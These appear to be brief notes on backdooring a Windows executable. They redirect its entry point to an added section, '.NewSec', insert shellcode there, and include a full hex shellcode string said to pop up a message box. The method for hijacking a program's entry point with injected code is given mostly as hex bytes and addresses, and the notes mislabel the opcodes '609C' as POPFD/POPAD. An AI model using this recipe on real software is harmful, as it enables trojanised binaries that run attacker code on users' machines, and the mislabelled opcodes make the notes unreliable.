ROffset -> 00107C00
-----------------------
OEP Instruction -> call 0x00BC0125
OEIP -> 00BBFE9B
-----------------------
.NewSec EntryPoint -> 00C61000
-----------------------
Insert POPFD and POPAD at the begining of .NewSec
and then follow by your shellcode.....

609C[shellcode] ---> "609C" is mean to POPFD + POPAD


609C31d2b230648b128b520c8b521c8b42088b72208b12807e0c3375f289c703783c8b577801c28b7a2001c731ed8b34af01c645813e4661746175f2817e084578697475e98b7a2401c7668b2c6f8b7a1c01c78b7caffc01c76879746501686b656e42682042726f89e1fe490b31c05150ffd7



example shellcode.... this shellcode just poping up the Win32 MessageBox....

Saved the previous ESP -> 0116FB6C 

search for the end of our shellcode using some pattern.... I use this -> "50ffd7"








